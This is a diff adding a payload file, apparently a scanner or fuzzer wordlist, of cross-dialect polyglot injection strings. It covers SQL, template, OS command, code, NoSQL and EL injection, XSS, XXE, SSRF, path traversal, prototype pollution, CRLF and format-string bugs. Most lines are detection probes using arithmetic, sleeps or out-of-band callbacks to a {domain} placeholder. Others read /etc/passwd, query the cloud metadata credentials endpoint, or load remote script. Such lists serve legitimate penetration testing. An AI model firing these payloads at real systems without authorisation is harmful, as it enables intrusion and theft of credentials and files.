@@ -1,0 +1,53 @@
+##POLYGLOT - SQLi Cross-Dialect (Error)##
+'AND 1=CONVERT(int,@@version)--/*'OR 1=extractvalue(1,concat(0x7e,version()))--*/"OR CAST(version() AS int)--
+##POLYGLOT - SQLi Cross-Dialect (Math: 1337)##
+'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/"UNION SELECT 7*191,7*191,7*191--
+##POLYGLOT - SQLi Cross-Dialect (Timing)##
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+##POLYGLOT - SQLi Cross-Dialect (OOB)##
+';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
+##POLYGLOT - SSTI Cross-Engine (Math: 1337)##
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)
+##POLYGLOT - SSTI Cross-Engine (Error)##
+${{<%[%'"}}%\
+##POLYGLOT - SSTI Cross-Engine (Timing)##
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}
+##POLYGLOT - SSTI Cross-Engine (OOB)##
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
+##POLYGLOT - OS Command Injection Cross-Shell (Timing)##
+;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
+##POLYGLOT - OS Command Injection Cross-Shell (Math: 1337)##
+;echo $((7*191)) #'|expr 7 \* 191|"$(echo $((7*191)))`expr 7 \* 191`
+##POLYGLOT - OS Command Injection Cross-Shell (OOB)##
+;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
+##POLYGLOT - Code Injection Cross-Language (Math: 1337)##
+7*191
+##POLYGLOT - Code Injection Cross-Language (Timing)##
+__import__('time').sleep(5)
+##POLYGLOT - Code Injection Cross-Language (OOB)##
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+##POLYGLOT - XSS Cross-Context (Math)##
+'"><img src=x onerror=alert(1337)><!--
+##POLYGLOT - XSS Blind/OOB##
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+##POLYGLOT - XXE (File Read)##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+##POLYGLOT - XXE (OOB)##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
+##POLYGLOT - SSRF##
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://{domain}/ssrf
+##POLYGLOT - Path Traversal##
+../../../../../../../etc/passwd
+##POLYGLOT - NoSQL Injection (Math: 1337)##
+return 7*191
+##POLYGLOT - NoSQL Injection (Error)##
+{"$gt":"","$ne":""}
+##POLYGLOT - EL Injection Cross-Engine (Math: 1337)##
+${7*191}
+##POLYGLOT - Prototype Pollution##
+{"__proto__":{"polluted":1337}}
+##POLYGLOT - CRLF/Header Injection##
+%0d%0aX-Injected:1337%0d%0a
+##POLYGLOT - Format String##
+%s%s%s%s%s%s%s%s%s%s
